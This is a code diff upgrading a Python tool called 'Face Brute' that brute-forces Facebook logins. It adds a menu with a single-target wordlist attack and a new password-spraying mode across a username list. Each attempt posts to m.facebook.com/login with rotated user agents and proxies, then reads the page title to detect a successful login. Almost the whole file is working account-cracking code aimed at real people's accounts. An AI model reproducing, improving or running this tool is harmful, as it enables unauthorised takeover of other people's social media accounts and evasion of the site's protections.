@@ -19,7 +19,7 @@ def banner():
     print ('')
     print (B+'███████'+W+'▄▄███████████▄')
     print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'    ╔═╗┌─┐┌─┐┌─┐')
-    print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'    ╠╣ ├─┤│  ├┤ '+O+'    V.1.0')
+    print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'    ╠╣ ├─┤│  ├┤ '+O+'    V.2.0')
     print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'    ╚  ┴ ┴└─┘└─┘')
     print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'        ╔╗ ┬─┐┬ ┬┌┬┐┌─┐')
     print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'        ╠╩╗├┬┘│ │ │ ├┤ ')
@@ -31,7 +31,9 @@ def banner():
     print (W+'           █  █')
     print (W+'            ▀▀')
     print ('')
-
+    print (C+' 01'+R+'        :'+W+' Brute Single Target with Wordlist')
+    print (C+' 02'+R+'        :'+W+' Brute Multiple Target with Single Password')
+    print ('')
 ua = [
    #Chrome
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
@@ -107,9 +109,10 @@ prox = [
     'http://202.70.80.233:8080',
 ]
 
-def fbbrute():
+def singlefbbrute():
     URL = 'https://m.facebook.com/login'
-    email = input(C+' Email '+R+'> '+W)
+    print ('')
+    email = input(C+' Username '+R+'> '+W)
     wlist = input(C+' Wordlist '+R+'> '+W)
     print ('')
     passwd = open(wlist, 'r')
@@ -129,17 +132,53 @@ def fbbrute():
             soup = BeautifulSoup(b.content, 'html.parser')
             a = soup.find('title')
             if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
-                print(C+' ['+W+' Trying '+C+']'+R+' > '+W+password,end='', flush=True)
-            else:
-                xx = ['/','-','\\','|']
-                for i in xx:
-                    print(C+' ['+W+' Trying '+C+']'+R+' > '+W+password,end='', flush=True)
-                    print ('')
-                    print(C+' ['+W+' Result '+C+']'+R+' > '+G+'Success')
-                    print(C+' ['+W+' Password '+C+']'+R+' > '+W+password)
-                    exit()
+                print(C+' ['+R+' ERROR '+C+']'+R+' > '+W+password,end='', flush=True)
+            elif(str(a) == '<title>Facebook</title>'):
+                print(C+' ['+G+' OK '+C+']'+R+' > '+W+password,end='', flush=True)
+                print ('')
+                print ('')
+                print(C+' ['+W+' Result '+C+']'+R+' > '+G+'Success')
+                print(C+' ['+W+' Password '+C+']'+R+' > '+W+password)
 
-    print(C+' ['+W+' Result '+C+']'+R+' > '+O+'Nothing')
+def multifbbrute():
+    URL = 'https://m.facebook.com/login'
+    print ('')
+    username = input(C+' Userlist '+R+'> '+W)
+    password = input(C+' Password '+R+'> '+W)
+    print ('')
+    uname = open(username, 'r')
+    for email in uname:
+        form_data = {
+            'email' : email,
+            'pass' : password
+        }
+        user_agent = random.choice(ua)
+        headers = {'User-Agent': user_agent}
+        proxies_a = random.choice(prox)
+        proxies = {'http': proxies_a}
+        with requests.Session() as c:
+            c.get(URL, headers=headers, proxies=proxies)
+            r = c.post(URL, data=form_data, headers=headers, proxies=proxies)
+            b = c.get('https://m.facebook.com/home.php', headers=headers, proxies=proxies)
+            soup = BeautifulSoup(b.content, 'html.parser')
+            a = soup.find('title')
+            if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
+                print(C+' ['+R+' ERROR '+C+']'+R+' > '+W+email,end='', flush=True)
+            if(str(a) == '<title>Facebook</title>'):
+                print(C+' ['+G+' OK '+C+']'+R+' > '+W+email,end='', flush=True)
+
+def main():
+    print ('')
+    cmd = str(input(R+' > '+W))
+    if cmd == '01' or cmd == '1':
+        singlefbbrute()
+        main()
+    elif cmd == '02' or cmd == '2':
+        multifbbrute()
+        main()
+    elif cmd == 'clear':
+        banner()
+        main()
 
 banner()
-fbbrute()
+main()
